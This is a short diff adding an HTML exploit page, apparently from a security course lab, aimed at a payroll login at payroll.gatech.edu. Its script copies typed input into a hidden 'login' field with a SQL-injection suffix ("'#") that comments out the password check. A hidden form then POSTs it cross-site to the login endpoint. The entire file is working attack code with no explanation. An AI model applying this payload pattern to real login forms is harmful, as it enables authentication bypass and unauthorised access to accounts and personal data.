@@ -1,0 +1,21 @@
+<body>
+	<input name="targetlogin" id="targetlogin" value="">
+	<form action="http://payroll.gatech.edu/index.php" onsubmit="" method="POST">
+	<!-- same drill. forms in this format if you need it-->
+		<input type="hidden" name="login" id="login" value="">
+		<input type="hidden" name="action" value="login">
+		<button id="exploit" onclick="">Hold on To Your Butts!</button>
+	</form>
+	<script type="text/javascript">
+		<!-- some script here if you need it -->
+		var target = document.getElementById('targetlogin');
+		var login = document.getElementById('login')
+		function change() {
+						login.value = target.value + "'#";
+		}
+		targetlogin.onkeyup = change;
+		change();
+
+	</script>
+</body>
+<!-- vim: set syntax=html ts=2 sw=2 sts=2 sr noet: -->
